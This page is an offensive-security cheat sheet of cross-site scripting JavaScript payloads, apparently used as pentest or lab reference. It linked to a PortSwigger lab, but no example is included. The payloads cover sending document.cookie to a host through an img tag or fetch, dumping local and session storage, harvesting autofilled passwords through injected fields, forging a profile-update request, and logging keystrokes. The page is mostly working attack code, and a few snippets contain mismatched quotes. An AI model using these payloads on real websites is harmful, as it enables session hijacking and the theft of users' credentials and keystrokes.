---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Offensive Payloads

## Fetch API

```javascript
fetch('http://localhost/endpoint’)
```

## Building Requests

```javascript
XMLHTTP Request:

let xhr = new XMLHttpRequest()

xhr.open('GET','http://localhost/endpoint',true)

xhr.send('email=update@email.com’)
```

## Stealing Cookies

```javascript
<img src="http://localhost?c='+document.cookie+'" />

fetch("http://localhost?c="+document.cookie);
```

## Accessing Local & Session Storage

```javascript
let localStorageData = JSON.stringify(localStorage)

let sessionStorageData = JSON.stringify(sessionStorage)
```

## Autofilled Creds

```javascript
// create the input elements

let usernameField = document.createElement("input")

usernameField.type = "text"

usernameField.name = "username"

usernameField.id = "username"

let passwordField = document.createElement("input")

passwordField.type = "password"

passwordField.name = "password"

passwordField.id = "password"

// append the elements to the body of the page

document.body.appendChild(usernameField)

document.body.appendChild(passwordField)

// exfiltrate as needed (we need to wait for the fields to be filled before exfiltrating the information)

setTimeout(function() {

 console.log("Username:", document.getElementById("username").value)

 console.log("Password:", document.getElementById("password").value)

}, 1000);
```

## Session Riding

```javascript
let xhr = new XMLHttpRequest();

xhr.open('POST','http://localhost/updateprofile',true);

xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');

xhr.send('email=updated@email.com’);
```

## Keylogging

```javascript
document.onkeypress = function(e) {

 get = window.event ? event : e

 key = get.keyCode ? get.keyCode : get.charCode

 key = String.fromCharCode(key)

 console.log(key)

}
```

## Examples

The example below is based on PortSwigger's _Exploiting cross-site scripting to steal cookies_ lab.
